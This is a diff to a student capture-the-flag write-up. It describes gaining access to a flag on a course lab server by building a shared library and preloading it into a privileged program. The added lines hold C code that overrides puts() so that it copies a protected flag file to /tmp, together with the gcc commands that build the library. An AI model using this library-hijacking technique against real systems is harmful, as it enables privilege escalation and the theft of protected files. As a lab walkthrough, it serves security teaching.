@@ -4,7 +4,7 @@
 
 Upon accessing the Linux server in the port `4006` of `ctf-fsi.fe.up.pt`, we were quick to search for potencial clues. Inside the directory `/home/flag_reader`, where we started, the following files were found:
 
-![img.png](images/env_start_files.png)
+![img.png](./images/env_start_files.png)
 
 While checking their content, we immediatily found our first clue in the file `admin_note.txt`:
 
@@ -21,7 +21,7 @@ We also find `reader`, which is the executable file for `main.c`, and `my_script
 
 After attempting to execute both `reader` and `my_script.sh`, we kept getting the following message:
 
-![img.png](images/reader_ouput.png)
+![img.png](images/reader_output.png)
 
 We found it weird that the file did not exist despite being included in `main.c`. After trying to access `/flags`, we were denied permission to access it. It had become clear we would **need to have more permissions** in order to access the flag. 
 
@@ -41,14 +41,21 @@ We started by creating a C file with "malicious" code, meant to write the flag o
 
 ```sh
 touch lib.c
-echo "codigo c, introduzido mais tarde" > /tmp/lib.c
+echo "#include <stdio.h>
+#include <stdlib.h>
+int puts (const char *str)
+{
+    system(\"/usr/bin/cat /flags/flag.txt > /tmp/flag.txt\");
+    return 0;
+}" > /tmp/lib.c
 ```
+We replaced the function puts(), since the program `reader` uses it.
 
 Afterwards, we created a shared library in the same folder, from this C file:
 
 ```sh
 gcc -c -o lib.o lib.c
-gcc -shared -o lib.o lib.so
+gcc -shared -o lib.so lib.o
 ```
 
 Lastly, all we had to do was set the environment variable:
